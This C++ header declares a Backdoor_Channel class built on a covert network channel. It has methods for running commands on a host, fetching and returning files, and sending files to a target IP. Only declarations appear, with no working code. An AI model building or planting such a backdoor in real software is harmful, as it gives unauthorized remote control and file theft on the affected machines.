#ifndef Backdoor_Channel_H
#define Backdoor_Channel_H

#include <string>
#include "covert_channel.h"

using std::string;
using namespace Tins;

class Backdoor_Channel : public Covert_Channel
{
public:
    void start(string interface, int listen_port, int target_port, string target_ip);
    bool callback_sendfile(string filepath);
    bool callback_sendNewFile(string filepath, string data);
    
private:
    bool parse_command(Job& j);
    bool handle_run_cmd(Job& j);
    bool handle_get_file(Job& j);
    bool handle_return_file(Job& j);
    
};

#endif // Covert_Channel_H
 